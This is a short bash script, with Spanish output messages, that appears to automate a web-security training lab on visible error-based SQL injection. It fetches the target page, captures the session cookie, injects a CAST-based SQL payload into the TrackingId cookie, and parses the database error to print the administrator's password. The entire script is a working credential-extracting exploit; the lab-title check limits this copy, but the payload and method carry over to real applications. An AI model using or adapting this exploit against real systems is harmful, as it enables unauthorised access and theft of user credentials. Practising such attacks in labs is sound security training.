#!/bin/bash

gyC="\e[0;37m\033[1m"
yC="\e[0;33m\033[1m"
bC="\e[0;34m\033[1m"
gC="\e[0;32m\033[1m"
rC="\e[0;31m\033[1m"
eC="\033[0m\e[0m"
lab="Visible error-based SQL injection"

[ $# -eq 0 ] && echo -e "\n${yC}[+] ${gyC}Uso: ${bC}$0 ${gC}<url>${eC}\n" && exit 1
url=${1%/}
echo -e "\n${yC}[+] ${gyC}Realizando peticion a ${bC}${url}${eC} "
response=$(curl -s -i "${url}") 
if ! echo -e "${response}" | grep "<title>${lab}</title>" &>/dev/null ; then
	echo -e "${rC}[!] ${gyC}Verifica la url proporcionada corresponda al laboratorio de ${gC}'${lab}'${eC}\n" && exit 1
fi
session=$(echo -e "${response}" | grep -o -P "session=\K[^;]*")
#trackingId=$(echo -e "${response}" | grep -o -P "TrackingId=\K[^;]*")
inyeccion="'+OR+1=(SELECT CAST(password AS INT) FROM users LIMIT 1)--"
echo -e "${yC}[+] ${gyC}Inyectando \"${gC}${inyeccion}${gyC}\" en la cookie de TrackingId...${eC} "
cookies="TrackingId=${inyeccion}; session=${session}"
response=$(curl -s -i -k -b "${cookies}"  "${url}")
pazz=$(echo -e "${response}" | grep -o -P 'type integer: "\K[^"]*' | head -n1)

echo -e "${yC}[+] ${gyC}La contraseña para el usuario 'administrator' es: ${gC}${pazz}${eC}\n"


